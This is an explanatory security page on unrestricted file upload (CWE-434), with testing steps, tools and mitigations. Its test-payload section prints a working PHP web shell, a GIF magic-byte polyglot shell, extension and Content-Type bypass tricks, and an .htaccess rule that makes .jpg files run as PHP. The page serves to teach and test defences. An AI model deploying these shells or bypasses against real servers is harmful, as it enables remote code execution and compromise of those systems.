# What is Unrestricted File Upload?

Unrestricted File Upload is when an app accepts a file without properly checking its type, content, or where it lands - and then serves or executes it. The worst case is uploading a web shell and getting remote code execution. Even without RCE, weak upload handling leads to stored XSS, SSRF (via SVG/XML), and denial of service.

## How it works

- The app trusts the file extension or the client-supplied `Content-Type`
- It stores the file inside the web root with its original name
- Requesting the uploaded file makes the server execute it

## Test payloads

```php
// shell.php - minimal PHP web shell (authorized testing only)
<?php system($_GET['cmd']); ?>
```

```text
# Bypass extension filters
shell.php  ->  shell.phtml, shell.php5, shell.pHp
shell.php.jpg          (double extension)
shell.php%00.jpg       (null byte, legacy)
shell.php;.jpg         (semicolon trick on some stacks)

# Bypass Content-Type checks: keep filename malicious but send
Content-Type: image/png

# Add a real magic-byte header so content sniffing passes
GIF89a; <?php system($_GET['cmd']); ?>
```

```apache
# .htaccess trick - make the server treat .jpg as PHP
AddType application/x-httpd-php .jpg
```

## Tools

- [Burp Suite](https://portswigger.net/burp) - tamper filename, Content-Type, and magic bytes
- [Upload_Bypass](https://github.com/sAjibuu/Upload_Bypass) - automated upload filter bypass
- [ffuf](https://github.com/ffuf/ffuf) - brute-force the upload directory to find your file

## Manual testing

1. Upload a normal image and find where it is stored/served
2. Swap in a script extension and see whether it is rejected
3. Work through bypasses: double extension, magic bytes, Content-Type, `.htaccess`
4. Request the uploaded file and check if code executes

## Mitigation

- Validate with an allowlist of extensions and verify real content type server-side
- Rename files to random values and strip the original extension
- Store uploads outside the web root or on a separate, non-executing domain
- Disable script execution in the upload directory; scan uploads for malware

## Deep dive

- [Unrestricted File Upload - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [PortSwigger file upload labs](https://portswigger.net/web-security/file-upload)

## CWE

- CWE-434: Unrestricted Upload of File with Dangerous Type
